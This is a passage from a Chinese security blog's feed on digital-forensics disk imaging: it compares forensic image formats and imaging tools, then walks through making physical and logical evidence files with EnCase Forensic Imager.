    <content type="html"><![CDATA[<h1 id="镜像格式"><a href="#镜像格式" class="headerlink" title="镜像格式"></a>镜像格式</h1><h2 id="镜像各格式的区别"><a href="#镜像各格式的区别" class="headerlink" title="镜像各格式的区别"></a>镜像各格式的区别</h2><ul><li><strong>DD镜像：</strong>也称成原始格式(RAW Image)。DD镜像 的优点是兼容性强，目前所有磁盘镜像和分析工具都支持DD格式。此外，由于没有压缩，镜像速度较快。DD镜像最主要的问题就是非压缩格式，镜像文件与原始证据磁盘容量完全一致。即便原始证据磁盘仅有很少的数据，也一样需要同样的磁盘容量。DD镜像是对嫌疑硬盘进行位对位的复制方法，因此生成的镜像文件中没有保存额外信息的空间。因此，例如硬盘序列号、调查员姓名、镜像地点等信息必须保存在镜像文件之外的单独文件.TXT文件中。由于这些信息没有被保存在镜像文件内部，就有可能出现丢失或与其他硬盘信息混淆的情况。也就是说DD 镜像文件不包 含文件头和校验值。相关数据信息可以配合以txt文本形式文件进行描述。”的文档。</li><li><strong>E01镜像：</strong>传统的EnCase证据文件（.E01）是法证分析工具EnCase的一个证据文件格式，较好的解决了DD镜像的一些不足。EnCase以一系列特有的压缩片段格式保存证据文件。每个片段都可以在需要时被单独地调用并解压缩，因此可以实现随机地访问镜像中的数据。Encase证据文件中包含有三个组成部分：文件头、校验值和数据块。这三部分组成了对于一个原始证据的描述，并可用于将证据文件重新恢复至硬盘。E01格式最大的问题就是兼容性问题。EnCase格式是非公开的、具有知识产权的商业软件镜像格式。</li><li><strong>Ex01镜像：</strong>EnCase V7引进的新格式，EnCase证据文件（.Ex01）是E01的数据加密格式，设置密码后，若忘记密码则无法读取其中数据。</li><li><strong>L01镜像：</strong>传统的EnCase逻辑证据文件（L01）L01是仅仅对元数据中的一部分文件制作镜像的一种格式。E01及L01文件虽然也支持添加密码，但是密码仅用来限制镜像文件的打开，数据部分并未真正加密，很多取证工具可以直接忽略E01及L01文件的密码。<strong>如果需要处理的对象是整个存储设备或整个分区，应该保存成E01或Ex01格式；如果仅仅对源数据中的部分文件制作镜像，应该选择L01或Lx01格式。</strong></li><li><strong>Lx01镜像：</strong>EnCase V7引进的新格式，现行的EnCase逻辑证据文件（.Lx01）Lx01是L01的数据加密格式，设置密码后，若忘记密码则无法读取其中数据。<strong>如果工作中要使用其他取证工具进行分析，为了保证兼容性，建议选择E01及L01格式，否则可以使用Ex01及Lx01格式。</strong></li><li><strong>AFF镜像：</strong>针对E01和DD镜像文件的不足，AFFLIB公司于2006年推出了开源的证据文件格式AFF格式（Advanced Forensics Format）。这种格式是公开且可扩展的。和EnCase证据文件格式相似，AFF也以压缩片段的方式保存磁盘镜像，镜像文件经过压缩容量明显减小。和EnCase不同的是，AFF既可以将元数据保存在镜像文件内部，也可以同时允许元数据被单独保存在一个文件夹中。一旦发生磁盘镜像文件破损的情况，AFF的内部连续性算法也能够保证尽可能多的将破损的镜像恢复修复。AFF分段镜像可以被开源工具zlib进行压缩，也可以保持未压缩状态。对AFF压缩格式可以节省空间，但是创建时间较长，而且分析处理的速度较慢。具体采用压缩还是不采用压缩，可以根据实际情况来决定。但是未压缩的AFF文件可以很容易地再次压缩。</li><li><strong>img镜像：</strong>img格式是<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%83%8F%E6%96%87%E4%BB%B6/18650247">图像文件</a>的一种格式，它具有很高的压缩效率，IMG格式支持任意大小的图像。img 图像文件格式，图像的数据是以类似二维数组格式存放的。在其第一行的头两个位置存放的是图像的宽度，其后面的两位是存放着图像的高度，接着的一个位置里存放着图像的灰度级，而其剩下的所有位置存放的都是图像的灰度。IMG格式常用于Digital Research 应用程序中。img格式属于<a href="https://baike.baidu.com/item/%E9%95%9C%E5%83%8F/1574">镜像</a>的一种，可以通过制作数据光盘或者使用虚拟光驱(如 WinMount)安装IMG数据文件。 由于.ISO只能压缩使用ISO9660和UDF这两种文件系统的存储媒介，意即.ISO只能拿来压缩CD或DVD，因此才发展出了.IMG，它是以.<a href="https://baike.baidu.com/item/ISO%E6%A0%BC%E5%BC%8F/10050107">ISO格式</a>为基础另外新增可压缩使用其它文件系统的存储媒介的能力，.IMG可向后兼容于.ISO，如果是拿来压缩CD或DVD，则使用.IMG和.ISO这两种格式所压缩出来的内容是一样的。img格式的打开方式可以是光盘刻录，也可以用软件解压。IMG可以做为以下用途：数字存储、传输、以及整片软盘内容的复制，可挂载到虚拟软盘上。</li></ul><p>**<br>**</p><h2 id="各产品特性对比表："><a href="#各产品特性对比表：" class="headerlink" title="各产品特性对比表："></a>各产品特性对比表：</h2><table><thead><tr><th>产品名</th><th>支持的系统</th><th>支持数据类型</th><th>支持镜像的格式</th></tr></thead><tbody><tr><td>EnCase Forensic Imager</td><td>win</td><td>镜像文件（包括E01、L01、Ex01、Lx01、dd、vmdk、vhd等格式）本地连接的各种磁盘、存储卡内存数据远程数据（需要配合LinEn使用）</td><td>Ex01/Lx01/E01/L01</td></tr><tr><td>dd/dc3dd</td><td>linux</td><td>磁盘文件数据</td><td>RAW</td></tr><tr><td>Getdata forensic imager</td><td>win</td><td>获取物理，逻辑，文件夹和文件。</td><td>E01/L01</td></tr><tr><td>Clonezilla</td><td>win/linux</td><td>磁盘文件数据</td><td>RAW</td></tr><tr><td>安恒windows应急取证精灵</td><td>win</td><td>支持在线或离线方式镜像可选择镜像的格式、分卷大小、储存位置、是否压缩、哈希计算方式</td><td>dd/E01/AFF</td></tr><tr><td>Datanumen disk image</td><td>win</td><td>支持各种磁盘和驱动器</td><td>img</td></tr><tr><td>Guymager</td><td>linux</td><td>支持各种磁盘和驱动器</td><td>dd/E01/AFF</td></tr></tbody></table><h2 id="各产品特性详情："><a href="#各产品特性详情：" class="headerlink" title="各产品特性详情："></a>各产品特性详情：</h2><h3 id="EnCase-Forensic-Imager-win"><a href="#EnCase-Forensic-Imager-win" class="headerlink" title="EnCase Forensic Imager(win)"></a>EnCase Forensic Imager(win)</h3><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><ul><li>允许获取本地驱动器</li><li>可以免费下载和使用吗</li><li>不需要安装</li><li>一个独立的产品不需要装箱取证许可证吗</li><li>允许浏览和查看潜在的证据文件，包括文件夹结构和文件元数据</li><li>使用强AES 256位加密保护Lx01和Ex01文件</li><li>可以通过USB部署，并用于执行获取一个实时设备</li></ul><p>EnCase Imager支持处理常见的各种数据类型：</p><ul><li>镜像文件（包括E01、L01、Ex01、Lx01、dd、vmdk、vhd等格式）</li><li>本地连接的各种磁盘、存储卡</li><li>内存数据</li><li>远程数据（需要配合LinEn使用）</li></ul><p>其中支持镜像文件，主要用来转换格式，以减小原镜像体积，以及添加证据编号、备注信息等各种元数据。</p><h4 id="镜像格式-1"><a href="#镜像格式-1" class="headerlink" title="镜像格式"></a>镜像格式</h4><p>EnCase Imager可以生成四种格式的镜像</p><ul><li>Ex01/Lx01/E01/L01</li></ul><h3 id="dd-dc3dd-linux"><a href="#dd-dc3dd-linux" class="headerlink" title="dd/dc3dd(linux)"></a>dd/dc3dd(linux)</h3><h4 id="特性-1"><a href="#特性-1" class="headerlink" title="特性:"></a>特性:</h4><ul><li>linux自带免安装</li></ul><h4 id="压缩格式："><a href="#压缩格式：" class="headerlink" title="压缩格式："></a>压缩格式：</h4><ul><li>RAW Image</li><li>可加gzip命令压缩</li></ul><h3 id="Getdata-forensic-imager-win"><a href="#Getdata-forensic-imager-win" class="headerlink" title="Getdata forensic imager (win)"></a>Getdata forensic imager (win)</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>获取物理，逻辑，文件夹和文件。</li><li>重新获取现有的取证图像文件。</li><li>支持使用GetData Forensics Servlet从远程设备进行获取。</li><li>使用MD5，SHA1或SHA256采集哈希值获取.E01或DD格式。</li><li>使用完整的MD5，SHA1或SHA256文件哈希获取L01格式的文件夹和文件。</li><li>创建后自动验证采集哈希。</li><li>对整个设备成像或设置开始和结束扇区位置。</li><li>将图像文件分割成没有段大小限制的自定义段。</li><li>设置设备扇区大小以获取512、2048或4096扇区大小的选项。</li><li>强制将Windows兼容文件名与Magnet Forensics产品一起使用的选项。</li></ul><h4 id="镜像格式-2"><a href="#镜像格式-2" class="headerlink" title="镜像格式"></a>镜像格式</h4><ul><li>E01/L01</li></ul><p>支持E01和L01格式的EnCase None，Fast，Good，Best压缩设置。包括E01和L01格式写入采集信息。</p><h3 id="Clonezilla-win-linux"><a href="#Clonezilla-win-linux" class="headerlink" title="Clonezilla (win\linux)"></a>Clonezilla (win\linux)</h3><h4 id="特性-2"><a href="#特性-2" class="headerlink" title="特性"></a>特性</h4><ul><li>支持GNU/Linux下的LVM2 (LVM版本1不支持)。</li><li>可以重新安装引导加载程序，包括grub(版本1和版本2)和syslinux。</li><li>支持MBR和GPT分区格式的硬盘驱动器。Clonezilla live也可以在BIOS或uEFI机器上启动。</li><li>支持无人值守模式。几乎所有的步骤都可以通过命令和选项来完成。您还可以使用许多引导参数来定制您自己的映像和克隆。</li><li>支持一个映像恢复到多个本地设备。</li><li>镜像可以被加密。这是通过ecryptfs完成的，这是一种符合posix的企业加密堆叠文件系统。</li><li>Clonezilla SE支持多播，适合大规模克隆。如果您的客户端支持PXE和局域网唤醒，您也可以远程使用它来保存或恢复一堆计算机。</li><li>Clonezilla lite服务器支持BT (Bittorrent)，适合大规模部署。BT模式的工作由Ezio完成。</li><li>映像文件可以在本地磁盘、ssh服务器、samba服务器、NFS服务器或WebDAV服务器上。</li><li>AES-256加密可用于保护数据的访问、存储和传输。</li><li>基于Partclone(默认)、Partimage(可选)、ntfsclone(可选)、dd对分区进行镜像或克隆。然而，包含其他一些程序的Clonezilla不仅可以保存和恢复分区，还可以保存和恢复整个磁盘。</li><li>通过使用我们自己开发的另一款免费软件drbl-winroll，可以自动更改克隆的MS windows机器的主机名、组名和SID。</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul><li><p>支持许多文件系统:</p></li><li><ul><li>(1)ext2、ext3, ext4, reiserfs, reiser4, xfs、jfs, btrfs, f2fs nilfs2 GNU / Linux, </li><li>(2) FAT12, FAT16, FAT32, NTFS Windows,</li><li>(3)HFS + Mac OS, </li><li>(4) UFS FreeBSD, NetBSD, OpenBSD, </li><li>(5) minix minix, </li><li>(6) VMFS3 VMFS5 VMWare ESX。</li></ul></li></ul><p>因此，无论32位(x86)操作系统还是64位(x86-64)操作系统，都可以克隆GNU/Linux、MS windows、intel Mac OS、FreeBSD、NetBSD、OpenBSD、Minix、VMWare ESX、Chrome OS/Chromium操作系统。对于这些文件系统，<strong>Partclone只保存和恢复分区中使用过的块。对于不支持的文件系统，在Clonezilla中，扇区到扇区的复制是由dd完成的。</strong></p><h4 id="镜像格式-3"><a href="#镜像格式-3" class="headerlink" title="镜像格式"></a>镜像格式</h4><ul><li>dd（RAW）</li></ul><p>**<br>**</p><h3 id="安恒windows应急取证精灵-win"><a href="#安恒windows应急取证精灵-win" class="headerlink" title="安恒windows应急取证精灵 (win)"></a>安恒windows应急取证精灵 (win)</h3><h4 id="特性-3"><a href="#特性-3" class="headerlink" title="特性"></a>特性</h4><ul><li>支持在线或离线方式镜像</li><li>可选择镜像的格式、分卷大小、储存位置、是否压缩、哈希计算方式</li></ul><h4 id="镜像格式-4"><a href="#镜像格式-4" class="headerlink" title="镜像格式"></a>镜像格式</h4><ul><li>dd/E01/AFF</li><li>支持MD5/sha1校验</li></ul><h3 id="Datanumen-disk-image-win"><a href="#Datanumen-disk-image-win" class="headerlink" title="Datanumen disk image (win)"></a>Datanumen disk image (win)</h3><h4 id="特性-4"><a href="#特性-4" class="headerlink" title="特性"></a>特性</h4><p>支持各种磁盘和驱动器。</p><p>支持Windows 95/98/ME/NT/2000/XP/Visa/7/8/8.1/10和Windows Server 2003/2008/2012/2016/2019。</p><p>支持恢复图像数据回驱动器。</p><p>支持从损坏的媒体克隆数据。</p><p>支持用指定的数据替换损坏的扇区。</p><p>支持批量克隆多个磁盘和驱动器。</p><p>理想用作计算机取证工具和电子发现(或e-discovery, eDiscovery)工具。</p><h4 id="镜像格式-5"><a href="#镜像格式-5" class="headerlink" title="镜像格式"></a>镜像格式</h4><ul><li>img</li></ul><h3 id="Guymager-linux"><a href="#Guymager-linux" class="headerlink" title="Guymager (linux)"></a>Guymager (linux)</h3><h4 id="特性："><a href="#特性：" class="headerlink" title="特性："></a>特性：</h4><p>Guymager[ˈgɪmɪdʒər]是一款免费的媒体采集取证成像仪。它的主要特点是:</p><p>•简单的用户界面在不同的语言</p><p>•在Linux下运行</p><p>•非常快，由于多线程，流水线设计和多线程数据压缩</p><p>•充分利用多处理器机器</p><p>•生成平面(dd)， EWF (E01)和AFF映像，支持磁盘克隆</p><p>•免费，完全开源</p><p>最新版本是0.8.12。</p><h4 id="镜像格式："><a href="#镜像格式：" class="headerlink" title="镜像格式："></a>镜像格式：</h4><p>dd/EWF (E01)/AFF</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;镜像格式&quot;&gt;&lt;a href=&quot;#镜像格式&quot; class=&quot;headerlink&quot; title=&quot;镜像格式&quot;&gt;&lt;/a&gt;镜像格式&lt;/h1&gt;&lt;h2 id=&quot;镜像各格式的区别&quot;&gt;&lt;a href=&quot;#镜像各格式的区别&quot; class=&quot;headerlink&quot; title=&quot;镜</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/"/>
    <id>https://xtpeeps.cn/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/</id>
    <published>2021-03-22T02:44:15.149Z</published>
    <updated>2021-04-24T09:36:45.718Z</updated>
    
    <content type="html"><![CDATA[<p>EnCase Forensic Imager(win)</p><p>EnCase V8是美国Guidance Software推出的最新计算机取证软件，全新的操作界面，采用全新的取证分析的工作流，让新版更加简单易用，提供了更加强大灵活的报告功能（可模板定制），此外EnCase V8将原有EnCase v7所有模块(VFS/PDE/EDS/FastBloc SE/CD-DVD)及Neutrino手机取证功能全部集成，成为业界首先将计算机取证、手机取证综合一体的电子数据取证分析软件。</p><p>Guidance Software Inc.是全球知名的计算机取证厂商，成立于1997年，在纳斯达克上市(NASDAQ: GUID)，总部设立在美国。其EnCase计算机取证系列产品在美国、欧洲等地的执法部门、司法机关及世界五百强（Fortune 500)广泛使用，在美国联邦法院、地方法院收到认可，已成为业界标准。目前已销售超过40000套EnCase产品，每年培训的取证专业人员超过6000人</p><p>当时间很短，您需要获取整个卷或选定的个人文件夹或文件，EnCase®法医Imager是您的选择工具。基于可靠的行业标准EnCase®取证采集技术，EnCase取证成像仪:</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>允许获取本地驱动器</li><li>可以免费下载和使用吗</li><li>不需要安装</li><li>一个独立的产品不需要装箱取证许可证吗</li><li>允许浏览和查看潜在的证据文件，包括文件夹结构和文件元数据</li><li>使用强AES 256位加密保护Lx01和Ex01文件</li><li>可以通过USB部署，并用于执行获取一个实时设备</li></ul><h2 id="支持源数据格式"><a href="#支持源数据格式" class="headerlink" title="支持源数据格式"></a>支持源数据格式</h2><p>EnCase Imager支持处理常见的各种数据类型：</p><ul><li>镜像文件（包括E01、L01、Ex01、Lx01、dd、vmdk、vhd等格式）</li><li>本地连接的各种磁盘、存储卡</li><li>内存数据</li><li>远程数据（需要配合LinEn使用）</li></ul><p>其中支持镜像文件，主要用来转换格式，以减小原镜像体积，以及添加证据编号、备注信息等各种元数据。</p><h2 id="支持镜像文件格式"><a href="#支持镜像文件格式" class="headerlink" title="支持镜像文件格式"></a>支持镜像文件格式</h2><p>EnCase Imager可以生成四种格式的镜像，分别是现行的</p><ul><li>EnCase证据文件（.Ex01）</li><li>现行的EnCase逻辑证据文件（.Lx01）</li><li>传统的EnCase证据文件（.E01）</li><li>传统的EnCase逻辑证据文件（L01）</li></ul><p><strong>如果需要处理的对象是整个存储设备或整个分区，应该保存成E01或Ex01格式；如果仅仅对源数据中的部分文件制作镜像，应该选择L01或Lx01格式。</strong></p><p>**<br>**</p><p>Ex01及Lx01格式是EnCase V7引进的新格式，该格式最大的变化是支持数据加密，设置密码后若不知道密码，无法读取镜像中的数据。E01及L01文件虽然也支持添加密码，但是密码仅用来限制镜像文件的打开，数据部分并未真正加密，很多取证工具可以直接忽略E01及L01文件的密码。</p><p><strong>如果工作中要使用其他取证工具进行分析，为了保证兼容性，建议选择E01及L01格式，否则可以使用Ex01及Lx01格式。</strong></p><h2 id="使用EnCase-Imager镜像"><a href="#使用EnCase-Imager镜像" class="headerlink" title="使用EnCase Imager镜像"></a>使用EnCase Imager镜像</h2><p>这里找到了一篇非常详尽的文章直接作为参考来自胡壮的个人博客：<a href="https://www.hustrong.com/2018/%E4%BD%BF%E7%94%A8EnCase-Imager%E5%88%B6%E4%BD%9C%E9%95%9C%E5%83%8F.html">https://www.hustrong.com/2018/%E4%BD%BF%E7%94%A8EnCase-Imager%E5%88%B6%E4%BD%9C%E9%95%9C%E5%83%8F.html</a></p><h3 id="使用EnCase-Imager制作证据文件"><a href="#使用EnCase-Imager制作证据文件" class="headerlink" title="使用EnCase Imager制作证据文件"></a>使用EnCase Imager制作证据文件</h3><p>接下来以一个实际案例来来介绍EnCase Imager的主要功能——制作磁盘镜像。实验选用了一个朗科32G优盘，序列号为AA00000000007275。</p><h4 id="添加设备"><a href="#添加设备" class="headerlink" title="添加设备"></a>添加设备</h4><p>在主界面点击“Add Local Device”，弹出添加本地设备的窗口，串口左边有6个可勾选项，点击某个选项，右边会出现对应的说明。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616144701988-2ffcc1c6-b355-456c-9fdb-f9e102cb04a9.png" class="" title="image"><p>添加本地设备选项</p><p>六个勾选项的含义如下：</p><ul><li><strong>Detect Tableau hardware</strong><br>检测Tableau硬件。如果没有连接Tableau设备，建议不要勾选。</li><li><strong>Only show Write-blocked</strong><br>只显示只读设备。勾选后后续的设备列表中仅显示只读设备。</li><li><strong>Detect leagacy FastBloc</strong><br>检测传统的FastBloc设备。如果没有连接FastBloc设备，建议不要勾选。</li><li><strong>Enable DCO Removal</strong><br>解除DCO限制。勾选后会忽略一些硬盘的DCO设置，可处理隐藏空间。</li><li><strong>Enable Physical Memory</strong><br>物理内存获取。勾选后后续的设备列表中会出现物理内存，如果需要制作内存镜像则必须勾选。</li><li><strong>Enable Process Memory</strong><br>进程内存获取。勾选后后续的设备列表中会出现各进程的列表，如果需要制作各进程内存镜像则必须勾选。</li></ul><p>我们直接点击“下一步”，并且勾选序号为29、磁盘序号为14的优盘。注意不要勾选成了序号为30的那一项，否则只会加载优盘中的整个分区内容，卷引导记录等信息将不被包括。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375872314-27787cae-2acf-4821-891b-0dd30f452f4d.png" class="" title="image"><p>设备列表</p><p>点击“完成”后，会自动打开“Evidence”标签页，可以看到磁盘14已经添加到证据列表中。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375872311-7f0866b0-4437-4446-b51a-8835e7857973.png" class="" title="image"><p>证据列表</p><h4 id="开始制作镜像"><a href="#开始制作镜像" class="headerlink" title="开始制作镜像"></a>开始制作镜像</h4><p>双击证据列表中的设备名“14”，或选中该项，点击“OPEN”，即可打开并浏览优盘中的数据。</p><p>打开该证据后，点击菜单栏的“Acquire”→“Acquire”即可开始制作镜像。需要注意的是，如果要制作整个优盘的镜像，树形面板中选中的必须是整个设备，对于本案例来说，选中的必须是“Entry”或“14”，否则接下来默认制作的仅仅是分区部分的镜像。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375872311-72ff303c-415d-41cd-a1b9-f62953d14072.png" class="" title="image"><p>开始制作镜像</p><h4 id="设置证据文件参数"><a href="#设置证据文件参数" class="headerlink" title="设置证据文件参数"></a>设置证据文件参数</h4><p>接下来需要设置证据文件的参数等信息，弹出的页面中包括“Location”、“Format” 及“Advanced”三部分设置选项。这些设置项是制作证据文件的关键。</p><p><strong>保存位置等设置项</strong></p><p>**<br>**<img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375937786-7f250eb7-5100-4568-b212-d667a57e6d4d.png" class="" title="image"></p><p>保存位置等设置项</p><ul><li><strong>Name</strong><br>设备名。默认也是镜像文件名。</li><li><strong>Case Number</strong><br>案件编号。</li><li><strong>Evidence Number</strong><br>证据编号。</li><li><strong>Examiner Name</strong><br>检验人员姓名。这一项是必填项。</li><li><strong>Note</strong><br>备注信息。</li><li><strong>Output Path</strong><br>输出路径。证据文件保存路径。</li><li><strong>Alternate Path</strong><br>备用路径。当镜像保存路径空间不够时，会保存到此位置。</li></ul><p><strong>证据文件格式等设置项</strong></p><p>**<br>**<img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375937889-59b37051-a8a6-4be3-9a4c-3b45c37bbaf8.png" class="" title="image"></p><p>证据文件格式等设置项</p><ul><li><strong>Evidence File Format</strong><br>证据文件格式。可以选择E01或Ex01格式。</li><li><strong>Compression</strong><br>压缩。可以选择启用或不启用数据压缩。</li><li><strong>Verification</strong><br>校验哈希。用于计算数据区域的哈希值并保存在镜像文件的元数据中，可选择不校验或或MD5校验、SHA-1校验、MD5及SHA-1同时校验。</li><li><strong>File Segment Size(MB)</strong><br>分段大小。设置单个证据文件大小，大于此值则自动生成E02、E03或Ex02、Ex03等文件。此值默认为2048(MB)，最小值为30(MB)。</li><li><strong>Password</strong><br>密码。此选项仅对E01格式有效，设置后，后续使用EnCase加载镜像文件需要此密码。</li><li><strong>EnCryption</strong><br>加密。此选项仅针对Ex01格式有效，可以对生成的镜像进行加密。</li></ul><p><strong>高级设置选项</strong></p><p>**<br>**<img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375937862-be9f1315-97c2-4746-ac4e-f08311acc11a.png" class="" title="image"></p><p>高级设置选项</p><ul><li><strong>Block size(Sectors)</strong><br>块大小。生成镜像文件时候的分块大小，保持默认即可。</li><li><strong>Error Granularity</strong><br>错误粒度。当设备遇到坏道、坏块时记录这些区域的精细程度，可以选择标准（standard）或精细（Exhaustive），保持默认即可。</li><li><strong>Start Sector</strong><br>起始扇区。如果制作的是整个设备的镜像，此值为“0”。</li><li><strong>Stop Sector</strong><br>结束扇区。</li><li><strong>Read ahead</strong><br>预读取。本人使用过程中一直不可选，暂时不知道使用场景。</li><li><strong>keep GUID</strong><br>极路GUID，暂时没有找到相关资料。</li><li><strong>Threads</strong><br>线程。可以设置读取线程和工作线程，读取线程默认为1，工作线程默认为5，一般保持默认。</li></ul><p>本案例中，镜像格式选择了兼容性比较好的E01，名称填写了“thumb”，案件编号填写了“20180616001”，证据编号填写了“20180616001-000-001”，操作人员填写了我的名字“胡壮”，备注信息填写了“EnCase Imager测试”，镜像保存路径选择了D盘根目录。</p><p>和FTK Imager等其他工具不同，EnCase Imager不允许操作人员字段留空。虽然其他字段可以留空，但是为了后续工作方便，强烈建议大家在制作镜像时尽量将所有字段按照实际情况填写完整。</p><p>一切设置好后，点击“确认”即可开始制作镜像，此时EnCase Imager窗口右下角会显示剩余时间。制作完成后，EnCase Imager会对镜像进行校验并替换掉证据列表中的源设备，后续的浏览操作全部基于镜像文件，校验时EnCase Imager窗口右下角同样会显示剩余时间。如下图所示。</p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375985927-9d00a20b-2b56-4f8f-92ed-68b83af0ca71.png" class="" title="image"></h4><p>镜像中</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375985893-8df387eb-e0e7-40e0-8110-5b6bb3c73e32.png" class="" title="image"><p>校验中</p><h4 id="EnCase-Imager证据文件中包含的数据"><a href="#EnCase-Imager证据文件中包含的数据" class="headerlink" title="EnCase Imager证据文件中包含的数据"></a>EnCase Imager证据文件中包含的数据</h4><p>镜像制作完毕后，在EnCase Imager窗口的证据列表中，可以查看镜像中的详细信息。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375937769-c85f5912-a8f8-4f6e-8d2e-5db6e0fe30f3.png" class="" title="image"><p>镜像中包含的信息</p><p>镜像中记录的一些信息如下：</p><ul><li><strong>证据名称</strong>：thumb</li><li><strong>优盘名称</strong>：Netac</li><li><strong>优盘序列号</strong>：AA00000000007275</li><li><strong>优盘型号</strong>：OnlyDisk</li><li><strong>案件编号</strong>：20180616001</li><li><strong>操作人员</strong>：胡壮</li><li><strong>证据编号</strong>：20180616001-000-001</li><li><strong>备注信息</strong>：EnCase Imager 测试</li><li><strong>源数据MD5</strong>：185d0bdb0398fd6711fe65ec3920dfca</li><li><strong>源数据SHA-1</strong>：896025a0f3a6ba4544a8dcf08d99cfa67317cd6f</li><li><strong>制作镜像的EnCase版本</strong>：7.09</li><li><strong>制作镜像时候操作系统版本</strong>：Windows 7</li><li><strong>压缩级别</strong>：最好</li></ul><h3 id="制作逻辑证据文件"><a href="#制作逻辑证据文件" class="headerlink" title="制作逻辑证据文件"></a>制作逻辑证据文件</h3><h4 id="选择需要的文件"><a href="#选择需要的文件" class="headerlink" title="选择需要的文件"></a>选择需要的文件</h4><p>制作逻辑证据文件，步骤与制作证据文件镜像比较相似，将所在磁盘或分区添加到证据列表，并打开证据进行浏览。和EnCase不同，EnCase Imager不允许直接将单个文件添加作为证据。</p><p>勾选需要的文件，点击菜单栏的“Acquire”→“Create Logical Evidence file”或列表面板右击选择“Acquire”→“Create Logical Evidence file”即可开始制作逻辑证据文件。本案例中勾选了“.disk”目录下的5个文件制作逻辑证据文件。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375720180-82ed43bd-5755-4c5b-a2e8-f8193ae9dcd8.png" class="" title="image"><p>制作逻辑证据文件</p><h4 id="设置逻辑证据参数"><a href="#设置逻辑证据参数" class="headerlink" title="设置逻辑证据参数"></a>设置逻辑证据参数</h4><p>制作逻辑证据文件，需要设置的参数比制作证据文件稍微少一些，但这些参数比制作证据文件时更难理解。</p><p><strong>保存位置等设置项</strong></p><p>**<br>**<img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375937780-9ec431a4-4d89-47ff-bc2f-1d01891f22d7.png" class="" title="image"></p><p>保存位置等设置项</p><ul><li><strong>Name</strong><br>设备名。默认也是逻辑证据文件文件名。</li><li><strong>Case Number</strong><br>案件编号。</li><li><strong>Evidence Number</strong><br>证据编号。</li><li><strong>Examiner Name</strong><br>检验人员姓名。这是必填项。</li><li><strong>Note</strong><br>备注信息。</li><li><strong>Add to existing evidence file</strong><br>追加到现有证据文件。将选中的文件添加都现存的某个逻辑证据文件，勾选此项后上面的信息无法填写。</li><li><strong>Output Path</strong><br>输出路径。逻辑证据文件保存路径。</li></ul><p><strong>文件信息</strong></p><p>**<br>**<img 